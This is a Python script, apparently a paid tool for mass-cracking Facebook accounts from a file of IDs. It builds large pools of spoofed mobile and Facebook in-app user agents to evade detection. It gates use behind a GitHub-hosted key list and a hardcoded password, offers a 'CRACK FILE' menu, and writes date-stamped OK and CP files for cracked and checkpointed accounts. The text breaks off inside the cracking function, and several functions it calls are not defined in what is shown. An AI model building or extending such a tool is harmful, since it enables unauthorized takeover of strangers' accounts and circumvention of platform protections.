
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
print("\033[1;37m [\u001b[36m•\033[1;37m] CHECKING FOR UPDATES \033[1;37m")
time.sleep(2)

 
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
prinCP=[]
try:
    prox= requests.get('https://github.com/MR-SHANTO786/File-Cloning/blob/main/Approved.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
    prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='SamsungBrowser'
    e=random.randrange(100, 9999)
    f='NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 12'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,115)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xd in range(1000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for ua in range(10000):
    a='Mozilla/5.0 (Symbian/55; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaX7-00'
    e=random.randrange(100, 9999)
    f='/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/533.4'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    aa='Mozilla/5.0 (Linux; Android 8.1.0)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' GT-S5830L'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for ua in range(1000):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5380D'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile HVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
    aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
    b=random.choice(['4','5','6','7','8','9','10','11','12'])
    c='ASUS_I006D Build/RKQ1.201022.002'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 Sleipnir/3.5.28'
    uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakua)
    

for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
    d=random.randrange(10,200)
    e='0.4844.88 '
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
    
for xd in range(9000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
    
for xd in range(1000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for ua in range(10000):
    a='Mozilla/5.0 (Symbian/55; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaX7-00'
    e=random.randrange(100, 9999)
    f='/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/533.4'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    aa='Mozilla/5.0 (Linux; Android 8.1.0)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' GT-S5830L'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for ua in range(1000):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5380D'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile HVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
    aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
    b=random.choice(['4','5','6','7','8','9','10','11','12'])
    c='ASUS_I006D Build/RKQ1.201022.002'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 Sleipnir/3.5.28'
    uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakua)
    
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
cpp = []
cooki = []
 

#------------[ HEART- ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
def clear():
	os.system('clear')
#------------------[ MAIN ]-----------------#
print("\033[1;37m [\u001b[36m•\033[1;37m] UPDATES DONE \033[1;37m")
#------------------[ MACHINE-SUPPORT ]---------------#
 
def saureeeeyy(x):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    menu()
def contact():
    os.system('xdg-open https://www.facebook.com/profile.php?id=61554904464871')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system('xdg-open https://www.facebook.com/profile.php?id=61554904464871')
logo ="""██╗  ██╗██████╗ ███████╗██╗  ██╗ █████╗ ██╗   ██╗    
██║ ██╔╝╚════██╗██╔════╝██║  ██║██╔══██╗██║   ██║    
█████╔╝  █████╔╝███████╗███████║███████║██║   ██║    
██╔═██╗  ╚═══██╗╚════██║██╔══██║██╔══██║╚██╗ ██╔╝    
██║  ██╗██████╔╝███████║██║  ██║██║  ██║ ╚████╔╝     
╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝      
                                                     
\033[1;37;1m-----------------------------------------------
 AUTHOR     : FRE4NY BR4ND
 GITHUB     : sabinxgod77
 FACEBOOK   : Hoppy
 TOOLS     \033[1;97m : \x1b[97m\033[37;41m PAID\033[0;m
 VERSION    : \033[1;36m1.1 \033[1;37m
-----------------------------------------------"""   
meyermarexudi =("""""")    
alltimexudi =(""" \033[32;1m[-]""")
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
fuckyoursali =(""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳""")
xudinaministar =(""" \033[38;1m[-] Importent Note """)
hedaborakarent =(""" \033[35;1m[𝟸] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰  """)

                  #____APPROVAL SYSTEM ADD_____#
os.system('clear')
print(logo)
def meyexudi():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "K".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/karunbista768/K3SHAV/blob/main/APPROVAL.txt').text
    if id in httpCaht:
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
      print(' \x1b[1;97m[•] WI-FI AND DATA BOTH WORKING')
      print(" \x1b[0m[•] YOUR KEY :\033[1;35m "+id)
      input(' \033[1;37m[•] IF U WANT TO BUY THEN PRESS ENTER ')
      os.system('am start https://www.facebook.com/K3SHAVxx'),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
#os.system("python K3SHAV.py")
def naima():
	os.system('clear')
print('   TO LOGIN ENTER USERNAME AND PASSWORD')	
print('-----------------------------------------------')
def back():
	login()
	
	import getpass

attemps = 0

while attemps < 12345677901:
    username = input(' \033[1;37m [\u001b[36m•\033[1;37m] ENTER USERNAME: ')
    password = input(' \033[1;37m [\u001b[36m•\033[1;37m] ENTER PASSWORD: ')

    if username == 'FRE' and password == 'GOD':
        print(' ')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
pass
 


#------------------[ MENU ]----------------#
def menu():
    os.system('clear')
    print(logo)
    print("\033[1;37m[\u001b[36m•\033[1;37m] TODAY'S DATE :\033[1;93m "+date)
    print('\033[0;97m-----------------------------------------------')
    print(f"""[\u001b[36m1\033[1;37m] CRACK FILE  """)
    print(f"""[\u001b[36m2\033[1;37m] CONTACT ADMIN""")
    print("""[\u001b[36m0\033[1;37m] LOGOUT""")
    print('\033[0;97m-----------------------------------------------')
    HEART = input('\033[1;37m[\u001b[36m•\033[1;37m] CHOOSE: ')
    if HEART in ['111']:
        login()
        dump_massal()
    elif HEART in ['1']:
        crack_file()
    elif HEART in ['2','02']:
        os.system('xdg-open https://www.facebook.com/K3SHAVxx')
        os.system("python K3SHAV.py")
    elif HEART in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m-----------------------------------------------')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m-----------------------------------------------')
        animation(' [×] SELECT CORRECTLY ')
        back()
 
 
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    print('\033[0;97m-----------------------------------------------')
    o = input(' [\u001b[36m•\033[1;37m] FILE NAME : ')
    try:lin = open(o).read().splitlines()
    except:
        print('\033[0;97m-----------------------------------------------')
        animat
